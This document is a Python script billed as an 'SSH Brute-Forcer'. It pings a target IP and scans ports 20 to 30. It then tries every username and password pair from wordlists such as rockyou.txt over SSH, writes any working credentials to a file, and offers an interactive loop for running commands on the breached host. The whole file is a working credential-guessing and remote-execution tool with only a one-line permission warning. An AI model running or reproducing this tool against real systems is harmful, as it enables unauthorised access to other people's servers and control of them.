import socket
import paramiko
import subprocess
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Stylish introduction
def print_intro():
    intro_text = f"""
{Fore.CYAN + Style.BRIGHT}Welcome to the SSH Brute-Forcer!
{Fore.YELLOW + Style.NORMAL}-------------------------------------
{Fore.GREEN}This tool will help you test SSH credentials against a target IP.
{Fore.RED}!!!Ensure you have permission before proceeding!!!
"""
    print(intro_text)

# Call the intro function
print_intro()
#The inputs for the script are the userlist and passlist paths and the target IP address.
target_ip = input("your target IP:\n")
# Function to send ping to the target IP address
def send_ping(target_ip):
    try:
        # Execute the ping command
        result = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True, timeout=5)
        if "Destination host unreachable" in result.stdout:
            print("Ping failed. Destination host unreachable")
            return False
        else:
            print("Ping successful")
            return True
    except subprocess.TimeoutExpired:
        print("Ping failed. Timeout expired")
        return False


# Check if the target is reachable via ping before proceeding
if not send_ping(target_ip):
    print("Goodbye")
    exit()
userlist_path =input("Enter the path of the usernames list:\n")
# Enter the path to userrock.txt
with open(userlist_path, "r") as userlist:
    usernames = userlist.read().splitlines()
passlist_path = input("Enter the path of the passwords list:\n")
# Enter the path to rockyou.txt
with open(passlist_path, "r") as passlist:
    passwords = passlist.read().splitlines()
#The function ssh is used to connect to the target IP address and check if the credentials are valid.
def ssh(target_ip, username, password, port):
    #The paramiko SSHClient is used to connect to the target IP address.
    client = paramiko.SSHClient()
    #The paramiko AutoAddPolicy is used to add the host key to the known_hosts file.
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        #The client is connected to the target IP address and the port.
        client.connect(target_ip,port=port, username=username, password=password, timeout=3)
    except paramiko.AuthenticationException:
        print(f"Wrong credentials try again {username} {password}")
        return False
    except paramiko.SSHException:
        print("SSHException Connection failed")
        return False
    else:
        print(f"Connection was successful {username} {password}")
        credentials_path = input("Enter the path to save the credentials:\n")
        with open(credentials_path, "w") as credentials:
            credentials.write(f"{username}@{target_ip}:{password}\n")
            print(f"Credentials written to {credentials_path}")
        return True
#The loop is used to check if the port is open and if the user wants to connect to it.
stop_attack = False

for port in range(20, 31):
    s = socket.socket()
    s.settimeout(1)
    try:
        # The socket is connected to the target IP address and the port.
        s.connect((target_ip, port))
        print(f"Port {port} open")
        connect = input(f"Do you want to connect to port {port}? (Yes/No):\n ")
        if connect.lower() == "yes":
            for username in usernames:
                for password in passwords:
                    if ssh(target_ip, username, password, port):
                        stop_attack = True
                        break  # Stop trying passwords if successful
                if stop_attack:
                    break  # Stop trying usernames if successful
            # Stop trying ports if successful
            if stop_attack:
                try:
                    command = input("Do you want to send commands to the target?(Yes/No):\n")
                    if command.lower() == "yes":
                        while command.lower() != "quit":
                            command = input("Enter the command to execute on the remote server (to stop send 'Quit'):\n")
                            # Create a SSH client
                            ssh_client = paramiko.SSHClient()
                            # Set the SSH client to automatically add the host key
                            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            # Connect to the target IP address
                            ssh_client.connect(target_ip, username=username, password=password, timeout=3)
                            # Execute the command
                            stdin, stdout, stderr = ssh_client.exec_command(command)
                            # Print the command result
                            command_result = stdout.read().decode()
                            print("Command execution result:")
                            print(command_result)
                        else:
                            print("Goodbye")
                    else:
                        print("Goodbye")
                except Exception as e:
                    print(f"Error: {e}")
                break  # Stop iterating ports if successful

    # If the port is closed, print that it is closed and continue to the next one
    except (socket.timeout, ConnectionRefusedError):
        print(f"Port {port} closed")
#Close the socket
s.close()
